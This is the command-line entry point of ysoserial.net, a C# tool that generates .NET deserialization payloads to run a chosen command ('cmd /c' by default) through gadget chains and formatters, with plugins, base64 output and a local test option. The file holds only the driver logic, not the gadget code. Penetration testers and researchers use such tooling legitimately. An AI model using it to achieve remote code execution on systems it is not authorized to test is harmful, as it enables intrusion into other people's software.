using ysoserial.Generators;
using ysoserial.Plugins;
using System;
using System.IO;
using System.Linq;
using NDesk.Options;
using System.Runtime.Remoting;
using System.Text;
using System.Collections.Generic;

namespace ysoserial
{
    class Program
    {
        //Command line arguments
        static string format = "raw";
        static string gadget = "";
        static string formatter = "";
        static string searchformatter = "";
        static string cmd = "";
        static Boolean rawcmd = false;
        static Boolean cmdstdin = false;
        static string plugin_name = "";
        static Boolean test = false;
        static Boolean minify = false;
        static Boolean show_help = false;
        static Boolean show_credit = false;

        static IEnumerable<string> generators;
        static IEnumerable<string> plugins;

        static OptionSet options = new OptionSet()
            {
                {"p|plugin=", "The plugin to be used.", v => plugin_name = v },
                {"o|output=", "The output format (raw|base64). Default: raw", v => format = v },
                {"g|gadget=", "The gadget chain.", v => gadget = v },
                {"f|formatter=", "The formatter.", v => formatter = v },
                {"c|command=", "The command to be executed.", v => cmd = v },
                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after first space is an argument).", v => rawcmd =  v != null },
                {"s|stdin", "The command to be executed will be read from standard input.", v => cmdstdin = v != null },
                {"t|test", "Whether to run payload locally. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"sf|searchformatter=", "Search in all formatters to show relevant gadgets and their formatters (other parameters will be ignored).", v => searchformatter =  v},
                {"h|help", "Shows this message and exit.", v => show_help = v != null },
                {"credit", "Shows the credit/history of gadgets and plugins (other parameters will be ignored).", v => show_credit =  v != null },
            };

        static void Main(string[] args)
        {
            try
            {
                var notMatchedArguments = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }

            if (
                ((cmd == "" && !cmdstdin) || formatter == "" || gadget == "" || format == "") &&
                plugin_name == "" && !show_credit && searchformatter == ""
            )
            {
                if(!show_help)
                    Console.WriteLine("Missing arguments.");
                show_help = true;
            }

            if (!rawcmd)
            {
                cmd = "cmd /c " + cmd;
            }

            var types = AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes());

            // Populate list of available gadgets
            var generatorTypes = types.Where(p => typeof(Generator).IsAssignableFrom(p) && !p.IsInterface);
            generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList().OrderBy(s=>s, StringComparer.CurrentCultureIgnoreCase);

            // Populate list of available plugins
            var pluginTypes = types.Where(p => typeof(Plugin).IsAssignableFrom(p) && !p.IsInterface);
            plugins = pluginTypes.Select(x => x.Name.Replace("Plugin", "")).ToList().OrderBy(s => s, StringComparer.CurrentCultureIgnoreCase); ;

            // Search in formatters
            if (searchformatter != "")
            {
                SearchFormatters(searchformatter);
            }

            // Show credits if requested
            if (show_credit)
            {
                ShowCredit();
            }

            // Show help if requested
            if (show_help)
            {
                ShowHelp();
            }

            object raw = null;

            // Try to execute plugin first
            if (plugin_name != "")
            {
                if (!plugins.Contains(plugin_name))
                {
                    Console.WriteLine("Plugin not supported.");
                    System.Environment.Exit(-1);
                }

                // Instantiate Plugin 
                Plugin plugin = null;
                try
                {
                    var container = Activator.CreateInstance(null, "ysoserial.Plugins." + plugin_name + "Plugin");
                    plugin = (Plugin)container.Unwrap();
                }
                catch
                {
                    Console.WriteLine("Plugin not supported!");
                    System.Environment.Exit(-1);
                }

                raw = plugin.Run(args);

            }
            // othersiwe run payload generation
            else if ((cmd != "" || cmdstdin) && formatter != "" && gadget != "" && format != "")
            {
                if (!generators.Contains(gadget))
                {
                    Console.WriteLine("Gadget not supported.");
                    System.Environment.Exit(-1);
                }

                // Instantiate Payload Generator
                Generator generator = null;
                try
                {
                    var container = Activator.CreateInstance(null, "ysoserial.Generators." + gadget + "Generator");
                    generator = (Generator)container.Unwrap();
                }
                catch
                {
                    Console.WriteLine("Gadget not supported!");
                    System.Environment.Exit(-1);
                }

                // Check Generator supports specified formatter
                if (generator.IsSupported(formatter))
                {
                    if (cmd == "" && cmdstdin)
                    {
                        cmd = Console.ReadLine();
                    }
                    raw = generator.Generate(cmd, formatter, test, minify);
                }
                else
                {
                    Console.WriteLine("Formatter not supported. Supported formatters are: " + string.Join(", ", generator.SupportedFormatters().OrderBy(s => s, StringComparer.CurrentCultureIgnoreCase)));
                    System.Environment.Exit(-1);
                }

                // LosFormatter is already base64 encoded
                if (format.ToLower().Equals("base64") && formatter.ToLower().Equals("losformatter"))
                {
                    format = "raw";
                }
            }

            // If requested, base64 encode the output
            if (format.ToLower().Equals("base64"))
            {
                if (raw.GetType() == typeof(String))
                {
                    raw = Encoding.ASCII.GetBytes((String)raw);
                }
                string b64encoded = Convert.ToBase64String((byte[])raw);
                Console.WriteLine(b64encoded);
            }
            else
            {
                MemoryStream data = new MemoryStream();
                if (raw.GetType() == typeof(String))
                {
                    data = new MemoryStream(Encoding.UTF8.GetBytes((String)raw ?? ""));
                }
                else if (raw.GetType() == typeof(byte[]))
                {
                    data = new MemoryStream((byte[])raw);
                }
                else
                {
                    Console.WriteLine("Unsupported serialized format");
                    System.Environment.Exit(-1);
                }

                using (Stream console = Console.OpenStandardOutput())
                {
                    byte[] buffer = new byte[4 * 1024];
                    int n = 1;
                    while (n > 0)
                    {
                        n = data.Read(buffer, 0, buffer.Length);
                        console.Write(buffer, 0, n);
                    }
                    console.Flush();
                }
            }
        }

        private static void SearchFormatters(string searchformatter)
        {
            Console.WriteLine("Formatter search result for \"" + searchformatter + "\":\n");
            foreach (string g in generators)
            {
                try
                {
                    if (g != "Generic")
                    {
                        ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Generators." + g + "Generator");
                        Generator gg = (Generator)container.Unwrap();
                        Boolean gadgetSelected = false;
                        foreach(string formatter in gg.SupportedFormatters().OrderBy(s => s, StringComparer.CurrentCultureIgnoreCase))
                        {
                            if (formatter.ToLower().Contains(searchformatter.ToLower()))
                            {
                                if(gadgetSelected == false)
                                {
                                    Console.WriteLine("\t" + gg.Name() + " (" + gg.Description() + ")");
                                    Console.WriteLine("\t\tFound formatters:");
                                    gadgetSelected = true;
                                }
                                Console.WriteLine("\t\t\t" + formatter);
                            }
                        }
                    }
                }
                catch
                {
                    
                }

            }
            System.Environment.Exit(-1);
        }

        private static void ShowHelp()
        {
            Console.WriteLine("ysoserial.net generates deserialization payloads for a variety of .NET formatters.");
            Console.WriteLine("");
            if (plugin_name == "")
            {
                Console.WriteLine("Available gadgets:\n");
                foreach (string g in generators)
                {
                    try
                    {
                        if (g != "Generic")
                        {
                            ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Generators." + g + "Generator");
                            Generator gg = (Generator)container.Unwrap();
                            Console.WriteLine("\t" + gg.Name() + " (" + gg.Description() + ")");
                            Console.WriteLine("\t\tFormatters:");

                            Console.WriteLine("\t\t\t" + string.Join(", ", gg.SupportedFormatters().OrderBy(s => s, StringComparer.CurrentCultureIgnoreCase)) + "\n");
                            /*
                            foreach (string f in gg.SupportedFormatters().ToArray())
                            {
                                Console.WriteLine("\t\t\t" + f);
                            }
                            */
                        }
                    }
                    catch
                    {
                        Console.WriteLine("Gadget not supported");
                        System.Environment.Exit(-1);
                    }

                }
                Console.WriteLine("");
                Console.WriteLine("Available plugins:");
                foreach (string p in plugins)
                {
                    try
                    {
                        if (p != "Generic")
                        {
                            ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Plugins." + p + "Plugin");
                            Plugin pp = (Plugin)container.Unwrap();
                            Console.WriteLine("\t" + pp.Name() + " (" + pp.Description() + ")");
                            //Console.WriteLine("\t\tOptions:");
                            //pp.Options().WriteOptionDescriptions(Console.Out);
                        }
                    }
                    catch
                    {
                        Console.WriteLine("Plugin not supported");
                        System.Environment.Exit(-1);
                    }

                }
                Console.WriteLine("");
                Console.WriteLine("Usage: ysoserial.exe [options]");
                Console.WriteLine("Options:");
                options.WriteOptionDescriptions(Console.Out);
                System.Environment.Exit(0);
            }
            else
            {
                try
                {
                    ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Plugins." + plugin_name + "Plugin");
                    Plugin pp = (Plugin)container.Unwrap();
                    Console.WriteLine("Plugin:\n");
                    Console.WriteLine(pp.Name() + " (" + pp.Description() + ")");
                    Console.WriteLine("\nOptions:\n");
                    pp.Options().WriteOptionDescriptions(Console.Out);
                }
                catch
                {
                    Console.WriteLine("Plugin not supported");
                }
                System.Environment.Exit(-1);
            }
        }

        private static void ShowCredit()
        {
            Console.WriteLine("ysoserial.net has been developed by Alvaro Muñoz (@pwntester)");
            Console.WriteLine("");
            Console.WriteLine("Credits for available formatters:");
            foreach (string g in generators)
            {
                try
                {
                    if (g != "Generic")
                    {
                        ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Generators." + g + "Generator");
                        Generator gg = (Generator)container.Unwrap();
                        //Console.WriteLine("\t" + gg.Name() + " (" + gg.Description() + ")");
                        Console.WriteLine("\t" + gg.Name());
                        Console.WriteLine("\t\t" + gg.Credit());
                    }
                }
                catch
                {
                    Console.WriteLine("Gadget not supported");
                    System.Environment.Exit(-1);
                }

            }
            Console.WriteLine("");
            Console.WriteLine("Credits for available plugins:");
            foreach (string p in plugins)
            {
                try
                {
                    if (p != "Generic")
                    {
                        ObjectHandle container = Activator.CreateInstance(null, "ysoserial.Plugins." + p + "Plugin");
                        Plugin pp = (Plugin)container.Unwrap();
                        //Console.WriteLine("\t" + pp.Name() + " (" + pp.Description() + ")");
                        Console.WriteLine("\t" + pp.Name());
                        Console.WriteLine("\t\t" + pp.Credit());
                    }
                }
                catch
                {
                    Console.WriteLine("Plugin not supported");
                    System.Environment.Exit(-1);
                }
            }
            Console.WriteLine("");
            Console.WriteLine("Various other people have also donated their time and contributed to this project.");
            Console.WriteLine("Please see https://github.com/pwntester/ysoserial.net/graphs/contributors to find those who have helped developing more features or have fixed bugs.");
            System.Environment.Exit(0);
        }
    }
}
